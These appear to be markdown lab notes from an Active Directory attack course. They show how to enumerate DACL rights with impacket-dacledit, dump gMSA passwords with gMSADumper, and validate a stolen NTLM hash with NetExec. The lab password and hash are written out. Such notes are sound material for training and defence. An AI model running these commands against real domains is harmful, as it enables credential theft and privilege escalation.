
## Using dacledit.py

#### Query what rights the UserX has over the target account `TARGET-USER`:

```shell
impacket-dacledit -principal <UserX> -target <TARGET-USER> -dc-ip <DOMAIN-IP> DOMAIN.local/<UserX>:<PASSWORD>
```
##### Examples

**WriteProperty** or **Validated-SPN** over the target account.

<img width="2420" height="519" alt="Pasted image 20251226114456" src="https://github.com/user-attachments/assets/812de2ee-5a53-4c1d-8695-ffb6710a9e8c" />

##### Querying UserX's DACL over the Domain

```shell
impacket-dacledit -principal <UserX> -target-dn dc=<domain>,dc=local -dc-ip 10.129.205.81 domain.local/<UserX>:<PASSWORD>
```

<img width="1853" height="241" alt="Pasted image 20251230121849" src="https://github.com/user-attachments/assets/921e4493-25c0-4f18-b8e5-1e68dacc4d1d" />

##### As we can see in the above output, `Pedro`, has **Self-Membership** over the target group `Backup Operators`; this means that `Pedro` can add himself to the group, but `Pedro` cannot add any other user.

<img width="1900" height="508" alt="Pasted image 20251226233506" src="https://github.com/user-attachments/assets/1b210d5f-64a1-4a01-b0b6-9e2c5db4465d" />

##### **All Extended Right**

<img width="1837" height="336" alt="Pasted image 20251227215942" src="https://github.com/user-attachments/assets/d7e38941-f5a4-4772-b6a1-b5392afe36c2" />

##### `Pedro` has **ForceChangePassword** over `TARGET-USER`

<img width="1713" height="286" alt="Pasted image 20251229140458" src="https://github.com/user-attachments/assets/822da076-32c1-457c-9968-db4e7ac520fc" />

##### pedro has **FullControl** over a `TARGET-USER`

<img width="1648" height="236" alt="Pasted image 20251229140619" src="https://github.com/user-attachments/assets/6f1bd5a7-10b1-41f2-9095-3f896dae3d72" />

##### pedro has **AllExtendedRights** over a `TARGET-USER`

<img width="1837" height="232" alt="Pasted image 20251229140708" src="https://github.com/user-attachments/assets/53d44834-1936-493e-a0a7-e66e910c0b40" />

##### Look for: **ReadProperty** on GUID `de4ae365-abab-4cd0-a85a-682150772084` for **ReadLAPSPassword**

<img width="1545" height="437" alt="Pasted image 20251229183138" src="https://github.com/user-attachments/assets/0359f5bb-9f12-4b79-b291-78415897465b" />

##### Pedro's **WriteOwner** over the User `GPOAdmin`:

<img width="1893" height="428" alt="Pasted image 20251230153906" src="https://github.com/user-attachments/assets/7656bbb4-d6f6-41c1-b201-80f58cf19719" />
## ReadGMSAPassword
```shell
wget https://github.com/micahvandeusen/gMSADumper/raw/refs/heads/main/gMSADumper.py
python3 gMSADumper.py -d inlanefreight.local -l 10.129.139.3 -u pedro -p SecuringAD01
```

<img width="1742" height="480" alt="Pasted image 20251229191306" src="https://github.com/user-attachments/assets/81da7ee2-b4ee-42c3-9110-71527c6212a5" />

##### use `NetExec` to validate the credentials
```shell
netexec ldap 10.129.139.3 -u jenkins-dev$ -H 14a45cca9fd6ef26c7f2140bb5a8be98
```
